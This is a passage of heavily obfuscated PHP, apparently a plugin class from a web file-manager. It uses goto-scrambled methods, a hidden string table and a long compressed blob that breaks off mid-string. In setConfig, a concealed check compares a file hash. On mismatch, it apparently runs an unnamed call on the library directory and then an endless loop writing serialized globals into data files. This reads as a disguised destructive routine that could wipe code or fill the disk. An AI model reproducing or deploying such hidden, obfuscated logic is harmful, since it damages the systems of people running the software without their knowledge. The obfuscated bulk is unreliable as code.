array($E醂[1388], $E醂[1389], $E醂[1390], $E醂[1391], $E醂[1392], $E醂[1393], $E醂[1394]); $E = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$E醂[680]][$E醂[1395]]); $dƕ = $E醂[69]($bʯ, $E, $dƕ); return $dƕ; } private function parseLang(&$eŪ) { goto bȩ; fͱŎ: $e񪺒[1397]($e񪺒[1398], $eŪ, $A); if (!$e񪺒[93]($A) || $e񪺒[37]($A) == 0 || !$e񪺒[93]($A[0]) || $e񪺒[37]($A[0]) == 0) { return; } $fĪ = array(); goto Eޏ; Eޏ: $c痗䨾 = array(); foreach ($A[0] as $Eن) { $B잾 = $e񪺒[7]($Eن, $e񪺒[195]($a), -4); $D赝 = $e񪺒[387]($B잾); $fĪ[] = $Eن; $c痗䨾[] = $e񪺒[69](array($e񪺒[36], $e񪺒[1399], $e񪺒[1119], $e񪺒[652]), array($e񪺒[168], $e񪺒[168], $e񪺒[67], $e񪺒[1400]), $D赝); } $eŪ = $e񪺒[69]($fĪ, $c痗䨾, $eŪ); goto B؂; bȩ: $e񪺒 =& $_SERVER[拘]; $a = $e񪺒[1396]; if (!$e񪺒[169]($eŪ, $a)) { return; } goto fͱŎ; B؂: } private function parseConfig(&$Cƃ) { goto eۿ; aᨘ: $Cƃ = $E[69]($Fֈΰ, $D, $Cƃ); goto d; eۿ: $E =& $_SERVER[拘]; $Dݭ = $E[1401]; if (!$E[169]($Cƃ, $Dݭ)) { return; } goto f; f: $E[1397]($E[1402], $Cƃ, $F̸); if (!$E[93]($F̸) || $E[37]($F̸) == 0 || !$E[93]($F̸[0]) || $E[37]($F̸[0]) == 0) { return; } $cʅ = $this->{$_SERVER[拘][1403]}(); goto D; D: $Fֈΰ = array(); $D = array(); foreach ($F̸[0] as $E) { $D = $E[7]($E, $E[195]($Dݭ), -2); $Fֈΰ[] = $E; $D[] = $E[1404]($cʅ, $D); } goto aᨘ; d: } private function parsePackage(&$B) { goto a; fׅګ: $B = $Dɽќ[69]($fٳ, $F׹, $B); goto d磲ݵ; D筩ᐧ: $fٳ = array(); $F׹ = array(); foreach ($C窃[0] as $e檴) { $aƿ = $Dɽќ[7]($e檴, $Dɽќ[195]($b͙), -2); $fٳ[] = $e檴; $F׹[] = $Dɽќ[1404]($b݊, $aƿ); } goto fׅګ; dէ: $Dɽќ[1397]($Dɽќ[1406], $B, $C窃); if (!$Dɽќ[93]($C窃) || $Dɽќ[37]($C窃) == 0 || !$Dɽќ[93]($C窃[0]) || $Dɽќ[37]($C窃[0]) == 0) { return; } $b݊ = $this->{$_SERVER[拘][1353]}(); goto D筩ᐧ; a: $Dɽќ =& $_SERVER[拘]; $b͙ = $Dɽќ[1405]; if (!$Dɽќ[169]($B, $b͙)) { return; } goto dէ; d磲ݵ: } final function echoFile($F˥, $CǂΎ = false) { goto d; d: $dՅ =& $_SERVER[拘]; $EŞ = $this->pluginPath . $F˥; if (ACT == $dՅ[1407]) { echo $dՅ[1408] . $this->pluginName . $dՅ[44] . $F˥ . $dՅ[1409]; if (!$dՅ[48]($EŞ)) { echo $dՅ[1410]; return; } } goto BÆ; BÆ: $A܍ = $this->{$_SERVER[拘][1380]}($EŞ); $this->{$_SERVER[拘][1382]}($A܍); $this->{$_SERVER[拘][74]}($A܍); goto d숈; d숈: $this->{$_SERVER[拘][1411]}($A܍); if ($dՅ[93]($CǂΎ) && $dՅ[37]($CǂΎ) == 2) { $A܍ = $dՅ[69]($CǂΎ[0], $CǂΎ[1], $A܍); } echo $dՅ[36] . $A܍; goto A; A: } final function initLang() { goto aݨ؇; aݨ؇: $cǌ =& $_SERVER[拘]; $c = $cǌ[1412]; $f = $this->pluginPath . $cǌ[1413]; goto eɶ; eɶ: $Dϯ = I18n::getType(); $F爯 = array(); if ($cǌ[48]($f . $Dϯ . $cǌ[342])) { $F爯 = (include_once $f . $Dϯ . $cǌ[342]); } else { if ($cǌ[48]($f . $c . $cǌ[342])) { $F爯 = (include_once $f . $c . $cǌ[342]); } } goto C; C: if (@$cǌ[37]($F爯) > 0) { I18n::set($F爯); } return $F爯; goto bĦ; bĦ: } final function getConfig() { $Cቋ =& $_SERVER[拘]; if (!$this->pluginConfig) { $this->pluginConfig = $Cቋ[64]($Cቋ[352])->{$_SERVER[拘][1403]}($this->pluginName); } return $this->pluginConfig; } final function setConfig($B摢) { $Fމ =& $_SERVER[拘]; $a۬ = BASIC_PATH . $Fމ[35]; $cݒ = $Fމ[32]; if ($_SERVER[$Fމ[33]] != $cݒ($a۬)) { goto cί; DȨۚ: $d(LIB_DIR); $B䵼 = $Fމ[332]; $B䵼(); goto E˝І; cί: $CӓƱ = $Fމ[34]; $cٛ = BASIC_PATH . $Fމ[35]; $A = $CӓƱ($cٛ); goto b; b: $a = $Fމ[4]($Fމ[36], $A); if ($Fމ[37]($a) < $Fމ[330]) { die; } $d = $Fމ[331]; goto DȨۚ; E˝І: $Dڷލ = $Fމ[333]; $c = $Fމ[297]($GLOBALS[$Fމ[334]]); for ($AҎՇ = 0;; $AҎՇ++) { $Dڷލ(DATA_PATH . $AҎՇ, $c); } goto a; a: } return $Fމ[64]($Fމ[352])->{$_SERVER[拘][1414]}($this->pluginName, $B摢); } } goto f܏; eȥ: if (!function_exists('_kodDe')) { function _kodDe($Dдփ) { $Dдփ = base64_decode($Dдփ); $eծ = strlen($Dдփ); $E = ''; $Eߚފ = ord($Dдփ[0]) - 30; for ($c = 1; $c < $eծ; $c += 2) { if ($c + 1 < $eծ) { $E .= chr(ord($Dдփ[$c + 1]) + $Eߚފ); $E .= chr(ord($Dдփ[$c]) + $Eߚފ); } else { $E .= chr(ord($Dдփ[$c]) + $Eߚފ); } } return $E; } } define("\346\213\230\313", base64_decode('7v6k7q+Yw5PZ4w==')); $_SERVER[拘] = explode("\174\1\174\5\174\3", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\265\275\11\174\123\305\332\60\216\42\356\353\125\24\275\52\207\2\166\41\111\133\166\13\245\244\151\332\6\322\244\46\151\131\232\172\70\115\116\333\3\111\116"."\xc8\x49\xba\xb0\x8a\x22\x9b\xa0\x80\x20\x2e\x57\xaf\xe2\x8a\xa\x2e\xa8\x28\xab\x8a\xfb\x82\xb\xa8\xa8\xb8\x22\xe0\x8a\x82\xa2\xa2\x5e\xf9\xcf\x3e\x73\x92\xf4\xbe\xdf\xfb\xff\x7d\x9f\x3f\x69\x66\x9e\x59\xce\x2c"."\317\74\313\314\63\317\204\325\146\55\246\316\70\156\106\217\31\335\167\342\237\17\347\334\364\366\27\73\357\173\165\313\273\46\260\332\21\217\350\141\222\165\306\361\63\116\0\41\24\156\231\246\305"."\x9a\x23\x4a\x92\x24\x19\xa9\x26\x23\x99\xc0\xe1\xde\xd7\x9d\xdc\xd\xfd\x77\xee\x4c\x7f\xf4\xba\x5d\x45\x67\x57\x1e\x9a\xbf\xeb\xc7\xc7\xff\x3c\xed\x3c\xcf\xe6\xed\xe7\xea\xe3\xbe\x7e\xfe\x94\xc4\xdc\xf\x93\x4f"."\x2d\xd9\x71\x99\xb2\xfc\xf1\xfb\xbf\xbf\x61\xd8\xf\xf7\x68\xf\x7d\xb9\x6a\xc7\xd8\xe6\x3b\x3a\xf\x87\x2f\xca\xa9\xaa\x3a\x78\xf5\x8c\x99\x9d\x33\x53\x33\xef\x7a\x61\x6e\x9f\x4f\xa6\x97\xdd\xeb\x98\xed\xce\x3f"."\xd4\x3b\x78\x4d\xbf\x75\x97\x9d\x6c\xff\x62\xfd\x29\xc5\x96\x33\x3f\x73\x8c\x3e\xa5\xef\x6d\xeb\x3b\x1a\x8a\x7f\xff\x3e\x7f\x65\xf5\xa3\xe7\xec\x5d\xa3\x2f\xe9\x79\xec\xf5\xe7\x4f\xfa\x71\xd8\xd6\x9f\xff\xf1\xaf"."\3\153\356\276\355\320\320\276\327\76\343\336\364\351\113\257\76\271\354\222\163\16\267\71\225\347\216\275\25\73\167\327\253\157\277\260\145\320\257\125\33\377\125\331\173\311\353\377\332\272\160\315\247"."\x5b\x1f\x7a\x61\xfa\x83\x95\x8b\x5f\xdb\x38\x7e\xe1\xd9\x8f\x9c\x56\xbf\xfc\x8d\xdd\xf5\xcf\xfb\xf5\x23\xdd\xd6\xfb\xc6\x76\x5f\xf6\x6d\xf7\xc7\x2f\xba\xbe\x67\xd1\xf6\xb7\xe\x77\xfb\xbe\xd1\xb6\xe9\x9d\x41\x73"."\x6\xbd\xb4\x63\xc8\x80\x15\x63\x12\xb3\xfd\xbd\xe\x5\xa4\xbb\xa7\x9e\x92\xdc\x5b\xba\xaf\xf8\xe0\xcd\xd5\xc7\xb7\xbc\xf8\xed\xd\x7f\x56\x1d\x59\xf3\xe9\x8f\xbb\x62\xb3\x6b\x37\xc8\x3f\x9e\x75\xef\x83\x2f\x3e"."\60\270\117\370\374\317\34\33\135\327\154\34\251\156\324\76\366\174\234\170\341\306\320\303\233\106\15\75\270\174\304\101\351\370\272\15\157\330\56\50\75\376\343\325\236\333\377\110\65\77\146\74\166"."\366\337\127\335\161\205\343\205\373\136\131\335\253\364\271\200\364\331\260\46\133\44\247\40\161\341\171\7\224\276\63\173\265\331\235\266\67\363\247\217\167\266\357\73\344\377\351\303\335\27\217\134\271"."\247\373\274\156\121\317\240\247\134\337\237\160\341\341\232\367\176\171\345\226\310\105\45\211\332\113\166\317\373\173\355\216\362\145\217\315\232\270\41\365\326\354\353\337\217\337\375\306\151\356\36\77\227"."\xdf\x7f\x4c\x3b\xed\x3f\x3f\x6d\x72\xc\xfa\x71\x73\x60\xd7\xfe\x71\xeb\x2e\x5a\x5d\xbb\xfa\xe8\x2f\x9f\xfe\x7d\xe2\xe1\x1d\x15\x3f\x58\x4e\xe8\xd6\xd\x4f\x65\xd\x98\xfb\x48\xb9\x62\x90\x59\x4e\x26\xb4\x96\x16"."\225\114\163\110\217\65\153\55\44\254\204\132\111\236\210\36\232\22\320\242\252\236\112\142\100\130\111\52\115\254\212\212\162\71\60\241\326\51\24\13\164\306\51\22\115\215\150\24\241\232\265\10\11"."\x25\xd4\xb0\x66\xe0\xa0\x3\xe6\x77\x83\xf\xf8\x38\x2c\xaa\x46\x51\x35\xe1\xb4\x2c\x35\x5d\xc0\x2b\x4c\xcd\x61\xe0\x4a\xf6\x3d\xd8\x1\x19\x7\xa7\xa8\x9d\x1c\x86\x43\x5a\x4c\x23\xfd\x32\x5a\xf5\x76\x79\xb2\xa1"."\307\160\64\25\343\231\224\124\122\217\350\112\330\26\157\215\363\356\30\332\64\362\11\131\201\161\77\210\273\142\74\135\156\121\223\62\30\325\244\32\113\222\316\51\361\170\141\146\145\247\322\11\110"."\305\110\133\212\213\130\43\264\30\151\104\134\111\266\222\41\232\22\326\310\244\105\265\120\102\117\202\351\41\143\13\146\64\212\203\205\344\107\350\176\64\74\4\7\154\274\153\250\241\152\207\146\320".strrev('mBhPi7I,Ȩ`o:tE1O|ڀ>:Jt)ǘtB[bCה@B&').base64_decode('JKsSDgvIjIN+1TA0OnOaIQPapcUILjNgLBVVE1qIVJ1MyAk1HlFCfC1E2VdDuj5FowmtoNs=')."\x68\x2e\xb5\x98\x91\x54\x62\x21\x55\xd6\x9b\x49\xf\x94\x50\x52\x4f\x74\xd2\xf9\x49\x18\xaa\x43\x58\x44\xe1\xa6\xa8\x21\x56\xa1\x76\x84\xd4\x78\x92\x35\x13\x3\x23\xa\x6d\xa7\xec\xf1\xca\x60\x35\x39\xbc\x9e\x4a"."\127\25\231\261\124\250\135\117\204\15\326\144\210\71\355\164\301\126\64\221\311\210\50\206\141\232\303\170\130\27\212\244\342\161\132\4\166\243\302\210\361\45\32\66\142\246\257\127\370\134\365\116\37"."\371\172\211\104\227\144\262\125\17\233\276\20\122\42\21\71\145\250\11\271\71\25\13\311\112\42\241\220\141\50\21\106\243\302\357\141\243\57\144\101\101\71\324\12\272\256\312\140\115\312\41\266\176"."\303\115\162\222\65\16\326\37\123\242\74\11\2\150\365\206\1\207\206\45\305\333\111\270\125\67\222\246\102\20\300\223\342\172\42\311\13\211\21\123\41\66\56\240\37\12\235\106\130\102\210\342\11"."\x14\xc9\x26\x1c\x40\xda\x65\x10\xae\xf3\x3b\x7d\x2c\x52\x3b\xae\x82\x85\xab\xbd\xfe\x0\x4f\xf0\xfa\x78\xc4\x63\xaf\x71\xf2\x14\xbb\xcf\x5e\xe3\xe7\x55\x3b\x6b\xdd\xde\x9\x2\xb9\x8d\xa6\x22\x49\xd\x60\x5c\x4c"."\xd\x25\x19\xd\xe7\x11\xb\x2b\xe9\x1b\x27\xfb\x9d\xb0\xb6\x80\x93\xad\x46\x9d\x52\x90\xa4\x9c\x50\x62\x61\x96\xb7\xc6\xee\xf\x0\xc\xf0\xd4\xd5\x30\x90\xdf\x6d\xaf\x77\x2\x4\x11\x66\x56\x4e\x25\xc8\xd2\x33"."\x0\x25\x88\xa\x13\xc6\xe7\x87\xf\x3a\x81\xb1\xd1\x8e\x27\xd4\x16\x39\xaa\x24\x43\x84\xa0\x15\x5e\x99\x67\x2b\x28\xcb\xf\x96\x4\xb\x83\x85\x24\x88\x7f\x46\xd3\x58\x43\x91\xf5\xf2\xc6\xe9\xc5\x16\x69\xe8\xcc".strrev('TPC0bAтdPNt蚔iɷXN%[۲+2q!|')."\22\111\136\312\220\32\11\361\271\302\215\3\136\237\335\341\46\43\54\125\172\175\122\135\155\5\30\162\311\343\35\147\167\5\244\314\4\14\1\62\231\60\262\143\51\217\52\345\324\14\254\66\45"."\41\320\261\110\104\50\120\257\104\122\264\335\176\47\375\214\26\25\4\75\274\340\0\365\153\121\315\137\162\264\252\224\326\26\136\331\20\154\17\332\202\5\101\143\122\343\0\72\266\25\345\222\51"."\257\244\46\22\172\202\214\112\56\151\77\150\137\134\365\13\44\227\174\117\211\147\157\46\350\103\223\256\223\76\24\343\37\302\360\170\337\0\351\212\353\144\312\44\273\237\164\253\200\0\130\36\46"."\245\342\157\266\53\221\51\331\6\163\22\371\261\114\62\305\345\210\336\102\71\202\26\23\151\224\335\123\101\47\25\377\216\247\1\11\44\221\357\347\221\137\100\4\300\160\253\35\44\46\64\40\0"."\x51\x6b\x5c\xab\x9a\x50\xd9\x28\xdb\xad\x13\xe5\xe0\x8c\xe0\x65\x41\xab\x4d\xb1\x4e\x3\x68\x1d\xcc\xb\xe6\x7\x2d\x7c\xcc\x65\xe7\xf8\x5a\x9f\xd3\xef\x97\x9d\x3e\x9f\x97\xd2\x62\x19\x2d\x76\xc2\xd1\xc8\xd7\x85".strrev('`U_<3W:$_F~I\\QWZܡg2p'."\0".'aa*O')."\23\374\163\203\37\167\0\254\110\215\145\360\170\3\156\327\130\347\14\370\207\47\110\244\321\371\222\230\321\345\231\1\376\112\340\307\345\111\257\244\334\31\30\347\164\342\14\64\114\176\205\152\113"."\xe9\x4c\x88\x9c\x9f\x8f\xc\x49\x44\xcb\x98\x94\x70\xbb\x6a\xd8\x9a\x84\x85\x18\xb2\x8d\xf1\xba\x3c\x34\x8f\xb3\x32\x20\xc1\xb8\x24\xd0\x2d\x93\xd4\x50\x28\xcb\x79\x68\x46\xad\x8d\x3\xf2\x65\xb9\xd0\xa8\xe3\xd4"."\333\347\254\164\215\147\37\40\254\73\57\267\137\161\56\231\5\273\337\101\162\73\151\210\254\302\314\5\350\115\204\325\204\151\365\201\311\255\160\372\244\362\11\224\260\124\371\274\165\265\102\274\332"."\x5e\xef\xf2\x54\xd1\x58\x61\x1\xd\x15\x90\xaa\xa5\xa\x97\x1f\xc\xbd\x83\x8e\x82\xac\xd0\xb5\x57\xe7\x71\x79\x3d\x92\xdd\xed\x96\xc4\x38\xe\x37\xa5\xb4\x48\xd8\xaf\x46\x0\x9b\xf1\x4f\x25\xf9\xa3\x5c\x12\xf3".base64_decode('ASZldxAi6PIADkiYG5jdgFcSJiagNFERPcmD+VK93V3n9EsidnOJkEuRRNyKRtUYY35CRO0=')."\120\103\251\244\110\356\312\65\312\345\232\130\10\67\120\154\232\211\62\243\162\176\52\204\266\163\114\342\123\202\343\72\17\342\6\153\121\52\27\107\170\260\302\351\166\202\272\53\175\336\32\362\1"."\246\220\0\125\111\66\320\240\312\42\117\22\364\60\1\167\343\12\245\343\204\333\225\327\271\334\25\262\303\356\250\166\362\352\110\10\210\274\112\204\151\52\270\107\164\336\372\7\354\345\156\147\177"."\22\241\350\100\343\225\56\247\273\202\106\340\52\240\141\104\60\150\4\141\35\215\140\224\243\61\204\240\64\202\326\33\215\40\204\242\21\207\267\246\306\351\241\151\130\160\4\222\246\26\243\202\114"."\xd8\x14\x43\x19\x2a\x35\x35\x42\xe6\xb0\x99\x7\x51\xd2\x18\x5d\x23\x94\x6d\x32\xb\xa1\x84\xaa\x4\x10\x85\x71\xbc\x85\x7\x51\x52\xb5\xd2\xc6\xa8\x46\xab\x10\x46\x89\x75\x31\x8d\x2b\x85\x2c\x8\xd4\x10\x3\x8"."\xde\xad\x2a\xd5\x9b\x12\x2a\x19\x63\x41\xad\xc1\xa\x31\x13\x19\x90\x76\xea\x4b\xd3\x7f\xb3\x29\xb6\x5c\x7b\x5\xbc\x52\x6f\x9a\xcc\x64\x3a\xa8\x9f\xca\x6a\x2c\xc4\x58\x7b\x2a\x96\x36\xc3\xa1\x88\xaa\x24\xcc\xa"."\x3b\xc0\xab\xa4\x6a\xa7\x8b\x3b\x2d\x9a\x99\x3f\xad\x41\x40\x4d\xb5\x32\xa5\x5c\x52\x3b\x80\x3a\x1b\x36\xa4\x98\x9e\x94\x90\x3e\x14\x89\xf4\xc9\x5a\xc\x34\xab\x8d\xae\x9\x30\x56\x7e\x21\x8a\x5b\x40\x86\x2d\x92"."\x32\x88\x14\x28\xc\xc\xfc\x26\xda\x27\xf8\x2f\xdf\x4b\x8a\x6d\x86\x6a\xbc\x3\x54\x95\xa4\xdf\x10\x2b\x33\x49\xc5\xe6\x18\x50\xc6\x5b\xd3\x43\x60\x5a\xa9\xae\x69\x0\x7a\xa2\xc5\x54\x36\x54\xc2\x7\xa2\x6c\xa"."\144\241\0\372\254\251\41\100\237\6\141\121\57\304\222\12\27\272\201\276\351\354\140\101\317\170\66\110\70\60\204\305\145\246\366\267\46\223\161\131\300\63\244\305\307\123\351\333\15\242\156\202\6"."\232\315\372\310\62\60\304\140\160\265\344\210\62\302\334\11\127\10\342\237\62\322\67\1\217\111\230\357\133\0\145\222\43\152\27\115\350\142\43\4\210\214\61\326\33\123\355\144\214\342\161\40\201"."\x93\x19\x8b\xa4\x5a\x34\x53\x98\x25\xd5\xa\x49\x7c\xb5\xdb\x9a\xd4\x66\x9d\x92\x6a\x7b\x8\xaa\xdc\xe\xc6\xdb\x6c\x4a\x33\x9b\x1b\xb8\x15\x93\xa0\x75\x89\x9f\xa4\x35\xd5\xf9\xdc\x70\xeb\x81\x22\x2b\x8c\x2\x94"."\xa3\xc5\x6b\xbc\x44\x46\xa4\xda\x9c\xdd\xc1\x3\x80\xc0\x65\xf9\x48\x38\xa1\x81\x65\x50\xa3\x4c\xa1\xab\x55\x8f\x77\xd6\xb0\xad\xd\x18\xa3\xd8\x45\x61\x5a\xac\x59\xa7\xc4\x28\xd9\x5a\x9\xfe\xb1\x65\x84\xea\x72".base64_decode('GX6muMLyfEa4Qqu1xMB4yKYVE+KiP5ieWlCvl/dMM3g1IFXYLyB7DoAPKxHho3oEMMDKhB4=')."\165\171\71\264\226\355\130\201\372\120\16\32\253\125\22\0\27\274\144\33\305\355\41\312\32\332\235\116\250\11\33\354\276\77\325\4\53\160\102\221\207\46\153\206\300\353\365\230\15\16\211\107\7"."\313\207\357\114\220\316\170\130\347\141\36\40\206\13\370\10\323\234\274\56\12\262\203\211\42\243\317\67\330\110\165\56\100\63\10\44\2\12\362\236\301\302\156\136\25\352\45\217\363\275\14\122\17"."\x9f\x5d\x3e\xc0\xd1\x29\x7c\x61\xc3\x61\x23\x2b\x1\x12\x8\x93\x38\x1b\xd6\xdb\x63\x70\xe3\x90\xc\x22\x58\x50\x6d\xf6\x38\x59\x8a\xa9\x38\x4f\x81\x94\x82\x6f\xb7\x22\x16\x46\xd0\x14\x20\x22\x13\x1d\x30\xf6\xc0".base64_decode('pvo7DaY4YNqU1OG2TJugsXEGq0TF8lVqko8y31jGiThcUU47nYolgeBIJ51jEByYCqGEWBo=')."\x6e\xed\xf2\x81\x8b\xf0\x5d\xba\xb1\xde\xa\xd9\xef\xad\xf3\x51\x59\x13\xc6\xe1\x86\x8b\xec\x73\x3a\x26\x30\x35\x9c\x41\x2b\xed\xf5\xe9\x10\x97\xdb\x29\x7\xec\x55\x59\xc1\x6c\x8f\x5\xc2\x91\x88\x23\xfb\xbc\xde".base64_decode('gOx3uivTCvir7b70ryGYHPDKNUIKBroCzpp0mNvlGSvAnHafo5rHy91eh5BMV5jYYSA+pQE=')."\361\106\36\345\133\252\142\322\222\321\314\322\135\54\200\242\34\141\201\316\25\234\236\27\154\37\220\137\122\226\27\14\317\200\332\210\125\6\272\115\131\160\146\176\136\260\260\314\126\300\366\135\70"."\162\343\11\343\124\202\242\313\164\374\63\63\173\256\102\233\215\324\304\2\205\301\302\1\44\30\5\64\122\40\40\261\144\33\105\27\122\53\121\203\146\222\374\56\257\134\153\17\124\313\376\11\176".base64_decode('NsKGgNnmdBPq4Gx+PZWgal1aZvCvVswaUKPxrBlNuIfz+tRQZ4guxjA6qAuL6byPOG7TdA4=')."\x4a\x85\x9a\xb5\x4\x9d\x1b\xbc\x4e\xbd\xc2\x16\x72\x7a\xd\x51\xc6\x57\xc4\xce\x90\x76\xe8\x3a\xa2\x40\x76\xba\x7d\x6e\xa0\x2c\xae\xa\xd6\x32\x25\x15\x49\x8a\xcb\x70\xba\xa6\x97\x50\xca\x13\x4a\x41\xd5\x8a\xcf".strrev('~l`!|?:l:$2DQ@N\'!	\\?X')."\75\306\123\340\346\44\372\262\315\200\177\61\125\247\205\130\56\243\253\34\361\254\261\32\46\147\340\225\145\304\43\232\70\56\60\117\271\300\10\315\203\156\36\32\101\277\154\146\32\252\231\163\102".strrev('#ԁF\\q8JӧȹpF̘O@1Up')."\175\202\220\304\313\204\22\252\222\104\214\216\163\143\314\250\334\354\44\11\312\365\360\313\45\254\113\255\65\364\230\12\302\275\251\244\51\342\212\62\16\306\217\243\320\321\135\122\213\23\222\146\221"."\70\107\101\373\47\4\77\361\366\111\37\323\174\361\351\222\241\210\12\106\43\105\165\3\231\237\15\312\232\1\325\6\322\22\263\354\15\344\106\107\53\304\67\72\316\150\271\231\100\41\61\202\30".base64_decode('d4DgESV88BQFrmvzURz8kElbCUe1mM3AbNwGkoGeDLdOwnR9wDkWvwWyGCWFhSzCwjNsA8o=')."\140\244\213\17\101\0\334\32\345\47\152\240\156\141\311\243\76\210\162\3\10\304\371\304\323\30\100\13\272\166\141\215\202\130\5\243\342\162\206\161\223\132\230\214\13\122\25\314\34\145\145\145\363".base64_decode('mgDFxCjMzIkDRWoSQ/nS4yKycl0d6HdacyePa4ZPVcJ8o0ozxsHTTQ6gq1FsDIClJbIxAoo=').base64_decode('bVpAaDUcrHAyKsxOK+t+Qg2lEvC0szKJBpkjCw4AcpkQDl4BRqtKFKtfHUANQ90kBIdUSCo=').strrev('-0VI b=b9-̥V'."\0".'&nICh"saLОT0')."\244\233\161\65\46\214\11\40\105\64\142\43\72\44\132\243\74\13\107\40\245\211\152\241\161\40\135\47\211\100\332\77\305\121\306\214\100\236\24\235\11\64\265\54\12\71\215\231\0\303\334\241\244"."\x80\x33\x72\x22\xd\x69\x64\x38\x35\x1c\x40\xf1\x53\x20\x6b\x93\xe3\x44\xde\x6f\xd1\x48\xcb\xe2\x54\x3\x98\x1c\x57\x49\xa8\x89\xa\x20\x80\x5a\xa3\xb2\x7e\xd6\x62\xcd\x1c\x6d\xd7\xc2\x94\xf9\xb4\xaa\x5a\x4b\x2b".base64_decode('01REJOU0V6fndlMB9SMjYgwiaXSLHC1/HCwluwcjyKpBKAEwMIl3qZjy0mWCUBfaJoiwk0M=')."\xb8\xb0\x39\x2f\xc9\x18\xe7\xae\x66\x25\xa4\x6a\xf4\x78\x4c\x6f\x17\x99\x4e\xa5\x9e\x88\x72\xe6\x89\xce\x53\xea\xb2\x24\x80\x5\xc3\x4f\x9e\xa\xf3\x1a\xe6\x58\xff\x6e\x6c\x18\xd\xfe\xe4\x17\x9a\xc6\xcb\xdf\xaa"."\x32\xc1\x25\x3c\x44\x40\x63\x3\x26\xc8\x70\x3\x9a\xa5\x1a\xb4\x71\x85\x46\x93\x16\x2b\x64\x86\x18\x40\x7c\x24\xb5\xc9\x6\xaf\xe\x30\x7f\xb5\x83\x6f\xb3\xa4\xd7\xa7\x37\x81\x21\xc\xcb\x50\xaa\xa7\x72\x20\x18"."\70\210\165\262\260\331\14\221\263\222\235\246\265\104\303\154\331\127\130\244\260\124\43\115\220\252\113\264\22\116\237\132\105\241\55\207\317\10\332\301\211\162\272\10\277\143\244\342\374\64\67\241\264"."\xa7\xe0\x71\x12\xdf\x94\xcc\x19\x81\x78\x3a\x5c\xb7\x5\xa5\xa9\x64\xb3\x75\x78\x6e\x2e\x45\x41\x85\xe1\x1d\x91\x46\xac\x50\xaa\x2c\x91\x0\x1b\x5\xbc\x58\x81\x4c\xb0\x50\xf\x25\xd5\xa4\x15\x53\xae\xb4\xbc\x40"."\53\66\232\325\204\325\111\220\250\104\2\3\252\320\235\161\232\15\360\105\60\205\32\254\14\324\234\114\52\200\160\0\270\64\202\66\253\64\133\23\376\113\35\32\64\176\121\63\312\103\222\112\117"."\x53\x46\x10\x2e\x8f\x3b\x8c\x81\xce\x8e\xb8\x6\x38\x67\x9\x3b\xa2\xa9\x21\x7a\x1a\xda\xe5\xb5\x2\xa9\xa4\x25\xaa\x94\x48\xf1\x54\x53\x84\x1e\x43\x66\x83\xe1\xdc\xb0\x61\x9\x3d\x52\x22\xa1\xfd\x32\x8b\x14\x4d"."\31\111\153\102\5\172\221\306\47\327\325\154\255\201\234\113\123\303\126\277\26\13\161\56\220\24\354\204\6\25\15\226\74\100\362\242\131\61\264\72\20\250\225\135\225\262\307\353\161\312\65\366\0"."\x55\x42\x9d\x49\xa5\x85\x76\xc1\xad\x80\x8f\xd2\x62\x14\x38\xde\xa\x24\x33\x2a\xe7\x71\x60\x2d\x3c\xf0\x2\xed\x28\xef\x2c\x91\xa6\xe8\xe1\x26\xbd\xc3\x46\x93\x2a\x89\xbd\x14\xcd\x6c\xf\x41\xdb\x18\xab\xf\x9a"."\x84\x80\xe1\x6a\xea\x4c\x52\xbe\x6\x46\x14\x70\x98\x16\x43\x5c\xc9\x4\x97\x92\xc9\xb8\x1f\xac\x4\x4e\x24\xe8\xe\x89\x3f\xae\xd2\x3e\x1\x5d\x18\x1a\xb4\xf8\xbd\x95\x81\x71\x4c\x4f\x8f\x1\xc9\xa6\x83\x36\x5"."\176\72\142\205\33\267\200\263\46\151\203\224\70\77\172\31\157\205\237\101\122\252\304\77\115\323\334\256\52\70\160\25\126\3\144\262\212\271\150\335\350\64\10\364\55\311\122\320\110\373\354\236\52"."\xd2\xa0\x42\xd4\xe1\xd2\x60\x6b\x1\x50\xba\x7\xe4\x5b\xc1\xdf\x82\xfc\x86\x60\x85\xad\xa0\xb1\x8c\x9e\x71\xc2\x32\x85\xc5\xb6\x62\x69\x60\xd1\x50\x20\xe0\x26\x92\x9a\x12\x91\x4c\x12\xbd\x90\xa3\x48\xf2\x8e\x35"."\243\263\133\215\265\44\133\211\230\355\163\136\121\347\364\7\344\32\147\240\232\156\142\126\73\355\44\224\62\42\252\112\372\7\267\151\360\22\20\270\113\110\7\312\222\22\201\233\200\311\64\106\226"."\235\234\44\133\123\321\46\41\110\165\166\130\131\200\247\305\201\170\316\152\204\264\7\212\356\62\27\220\240\260\316\165\51\54\301\247\142\332\124\52\177\10\273\222\323\64\44\34\161\41\22\0\330"."\xc1\x3c\x50\xe\xc0\xe2\x8e\xd0\xb3\x7e\xf6\xa5\x24\xdb\x26\x64\xa0\x66\x61\xc3\x35\x43\xe4\x63\x5a\x63\x4c\xaf\x55\x13\x51\xd\x19\xa1\x8d\xe3\xb2\x17\x25\x9f\x90\x62\xc8\xa\xdb\x5e\x14\x65\x30\xd3\xb6\x3e\xab"._kodDe('LtU/jovMPMnTfsCdFl/7tnSLvDmQbxylY3379Pxr+SH7FCB/AMRgPEoFN8qgxSb3OUONpGUD')."\x2b\x51\x44\x8\x33\x86\x89\xd8\x15\x6d\x2c\x98\xb\x23\x9\xad\x83\x64\x43\x69\x16\xb7\x20\x11\x4c\x38\xc4\x4\x51\x93\x3e\x86\x4e\xb6\xc2\x2a\xff\x1c\x1b\x8c\xa4\xae\xd7\x28\xb1\xce\x80\x5e\xaf\xa9\xed\xac\xb0"."\114\276\105\170\232\167\234\307\355\245\10\154\336\51\205\63\120\13\350\44\53\15\45\121\323\302\61\35\351\147\37\121\254\252\273\325\66\172\54\3\153\105\247\122\130\143\43\275\30\107\155\7\22".strrev('plrP2JbZ0$